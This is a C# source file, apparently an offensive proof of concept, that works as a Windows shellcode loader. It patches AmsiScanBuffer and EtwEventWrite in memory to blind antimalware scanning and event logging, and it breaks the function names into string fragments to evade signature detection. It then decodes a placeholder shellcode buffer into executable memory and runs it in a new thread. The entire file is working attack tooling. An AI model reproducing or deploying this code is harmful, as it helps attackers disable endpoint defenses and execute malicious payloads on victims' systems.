using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;

// Yes the code is shit, but meh so what - not like I have the whole day to write good pocs
namespace ConsoleApp1 {
	
	public class PatchAMSIAndETW
	{
		
		[DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
		
		private static void PatchETW()
		{
			try 
			{
				byte[] patchbyte = new byte[0];
        if (IntPtr.Size == 4)
				{
            string patchbytestring2 = "33,c0," + "c2,14,00";
            string[] patchbytestring = patchbytestring2.Split(',');
            patchbyte = new byte[patchbytestring.Length];
            for (int i = 0; i < patchbytestring.Length; i++)
						{
                patchbyte[i] = Convert.ToByte(patchbytestring[i], 16);
            }
        }else 
				{
            string patchbytestring2 = "48,3" + "3,C0,C3";
            string[] patchbytestring = patchbytestring2.Split(',');
            patchbyte = new byte[patchbytestring.Length];
            for (int i = 0; i < patchbytestring.Length; i++)
						{
                patchbyte[i] = Convert.ToByte(patchbytestring[i], 16);
            }
        }
				var enteeediiielel = LoadLibrary(("ntd" + "ll.dll"));
	      var etwEventSend = GetProcAddress(enteeediiielel, ("Et" + "wE" + "ve" + "nt" + "Wr" + "it" + "e"));
				uint oldProtect;
				VirtualProtect(etwEventSend, (UIntPtr)patchbyte.Length, 0x40, out oldProtect);
        Marshal.Copy(patchbyte, 0, etwEventSend, patchbyte.Length);
			}catch (Exception e)
			{
				Console.WriteLine(" [!] {0}", e.Message);
				Console.WriteLine(" [!] {0}", e.InnerException);
			}
		}

	    private static void PatchAMSI()
			{
	        try {
							LoadLibrary("A" + "m" + "s" + "i" + "." + "d" + "ll");
	            byte[] patchbyte = new byte[0];
	            if (IntPtr.Size == 4)
							{
	                string patchbytestring2 = "B8,57,00,07,80,C2,18,00";
	                string[] patchbytestring = patchbytestring2.Split(',');
	                patchbyte = new byte[patchbytestring.Length];
	                for (int i = 0; i < patchbytestring.Length; i++)
									{
	                    patchbyte[i] = Convert.ToByte(patchbytestring[i], 16);
	                }
	            }else
							{
	                string patchbytestring2 = "B8,57,00,07,80,C3";
	                string[] patchbytestring = patchbytestring2.Split(',');
	                patchbyte = new byte[patchbytestring.Length];
	                for (int i = 0; i < patchbytestring.Length; i++)
									{
	                    patchbyte[i] = Convert.ToByte(patchbytestring[i], 16);
	                }
	            }
							var enteeediiielel = LoadLibrary(("ams" + "i.dll"));
				      var etwEventSend = GetProcAddress(enteeediiielel, ("Am" + "si" + "Sc" + "an" + "Bu" + "ff" + "er"));
							uint oldProtect;
							VirtualProtect(etwEventSend, (UIntPtr)patchbyte.Length, 0x40, out oldProtect);
			        Marshal.Copy(patchbyte, 0, etwEventSend, patchbyte.Length);
	        }catch (Exception e)
					{
	            Console.WriteLine(" [!] {0}", e.Message);
	            Console.WriteLine(" [!] {0}", e.InnerException);
	        }
	    }

	    public static void Mein()
			{
	        PatchAMSI();
	        PatchETW();
	    }
	}
	
	class Program{
		[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
		static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
		
		[DllImport("kernel32.dll")]
		static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

		[DllImport("kernel32.dll")]
		static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
		
		[DllImport("kernel32.dll")]
		static extern IntPtr GetCurrentProcess();
		
		static void Main(string[] args)
		{
			byte[] buf = new byte[] { /* shellcode */ };
			
			int size = buf.Length;
			
			IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)size, 0x3000, 0x40); 
			
			Marshal.Copy(buf, 0, addr, size);
			
			buf = new byte[0];
			
			int key = 666; // key used to encode the shellcode
			
			IntPtr ptr;
			byte[] baite = new byte[1] { 0x90 };
			for (int i = 0; i < size; i++)
			{
				ptr = IntPtr.Add(addr, i);
				Marshal.Copy(ptr, baite, 0, 1);
				baite[0] = (byte)(((uint)baite[0] - key) & 0xFF);
				Marshal.Copy(baite, 0, ptr, 1);
			}
			
			PatchAMSIAndETW.Mein();
			
			IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
			
			WaitForSingleObject(hThread, 0xFFFFFFFF);
		}
	}
}